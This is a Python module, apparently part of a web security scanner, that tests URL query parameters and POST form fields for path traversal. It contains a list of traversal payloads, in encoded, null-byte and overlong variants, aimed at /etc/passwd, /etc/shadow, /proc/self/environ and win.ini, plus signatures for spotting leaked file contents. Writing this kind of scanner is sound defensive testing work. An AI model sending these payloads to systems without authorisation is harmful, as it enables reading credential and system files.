from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import logging
from scanner.http_client import HttpClient


logger = logging.getLogger(__name__)


PATH_PARAM_HINTS = [
    "file", "path", "download", "document", "doc", "template",
    "name", "filename", "page", "view", "include", "load",
    "read", "fetch", "data", "src", "source", "resource"
]

# Linux/Mac paths
_LINUX = [
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../etc/shadow",
    "../proc/self/environ",
    "../etc/hosts",
    # URL-encoded
    "..%2Fetc%2Fpasswd",
    "..%2F..%2Fetc%2Fpasswd",
    # Double encoded
    "..%252Fetc%252Fpasswd",
    # Null byte (some older parsers)
    "../etc/passwd%00",
    "../etc/passwd%00.jpg",
    # dot-dot-slash variants
    "....//....//etc/passwd",
    ".././.././etc/passwd",
    # Unicode / UTF-8 overlong
    "%c0%ae%c0%ae/etc/passwd",
]

# Windows paths
_WINDOWS = [
    "..\\..\\windows\\win.ini",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "..%5C..%5Cwindows%5Cwin.ini",
    "..%5C..%5C..%5Cwindows%5Cwin.ini",
    "....\\\\....\\\\windows\\win.ini",
    # Absolute path hint
    "C:\\Windows\\win.ini",
    "C:/Windows/win.ini",
]

TRAVERSAL_PAYLOADS = _LINUX + _WINDOWS

SIGNATURES = [
    # Linux
    "root:x:0:0",
    "root:*:",
    "/bin/bash",
    "/bin/sh",
    "daemon:x:",
    "nobody:x:",
    "127.0.0.1",   # /etc/hosts
    "localhost",    # /etc/hosts
    "PATH=",        # /proc/self/environ
    # Windows
    "[fonts]",
    "[extensions]",
    "[Mail]",
    "[MCI Extensions",
    "for 16-bit app support",
]


def _probe(client, url_or_none, payload, param_label):
    """Probe a single URL with a traversal payload. Returns result dict or None."""
    if not url_or_none:
        return None
    try:
        response = client.get(url_or_none)
        body = response.text or ""
        matched = [sig for sig in SIGNATURES if sig in body]
        if matched:
            return {
                "control": f"Path Traversal: {param_label}",
                "status": "Hallazgo",
                "severity": "Crítica",
                "description": "Se confirmó lectura de archivo del sistema mediante path traversal.",
                "evidence": f"URL: {url_or_none} | Payload: {payload} | Firmas: {', '.join(matched[:3])}",
                "recommendation": "Normalizar rutas, aplicar allowlist, aislar directorios y evitar acceso directo a rutas de usuario."
            }
    except Exception:
        logger.debug("Fallo en _probe de path traversal", exc_info=True)
    return None


def scan_path_traversal(pages):
    client = HttpClient()
    results = []
    seen = set()

    for page in pages:
        page_url = page.get("url") or page.get("final_url") or ""
        if not page_url:
            continue
        parsed = urlparse(page_url)
        params = parse_qs(parsed.query)

        for param in list(params.keys()):
            if param.lower() not in PATH_PARAM_HINTS:
                continue

            for payload in TRAVERSAL_PAYLOADS:
                mutated = params.copy()
                mutated[param] = payload
                test_url = urlunparse(parsed._replace(query=urlencode(mutated, doseq=True)))

                key = (param, payload[:30])
                if key in seen:
                    continue
                seen.add(key)

                res = _probe(client, test_url, payload, f"{param} (GET)")
                if res:
                    results.append(res)
                    break

        # Also try POST forms containing file/path fields
        for form in (page.get("forms") or []):
            if not isinstance(form, dict):
                continue
            for field in form.get("fields", []):
                fname = str(field.get("name", "")).lower()
                if fname not in PATH_PARAM_HINTS:
                    continue
                for payload in TRAVERSAL_PAYLOADS[:8]:  # keep POST probing lighter
                    data = {f["name"]: f.get("value", "") for f in form.get("fields", []) if f.get("name")}
                    data[field["name"]] = payload
                    try:
                        response = client.post(form.get("action") or page_url, data=data)
                        body = response.text or ""
                        matched = [sig for sig in SIGNATURES if sig in body]
                        if matched:
                            results.append({
                                "control": f"Path Traversal POST: {field['name']}",
                                "status": "Hallazgo",
                                "severity": "Crítica",
                                "description": "Lectura de archivo local detectada via POST.",
                                "evidence": f"URL: {form.get('action')} | Campo: {field['name']} | Payload: {payload} | Firmas: {', '.join(matched[:3])}",
                                "recommendation": "Normalizar rutas, aplicar allowlist y evitar acceso directo basado en parámetros de usuario."
                            })
                            break
                    except Exception:
                        logger.debug("Fallo en prueba path traversal POST", exc_info=True)

    if not results:
        results.append({
            "control": "Path Traversal",
            "status": "No evidenciado",
            "severity": "Informativa",
            "description": "No se detectaron indicios de path traversal en parámetros analizados.",
            "evidence": "Sin firmas de archivos locales.",
            "recommendation": "Complementar con endpoints autenticados de descarga o generación documental."
        })

    return results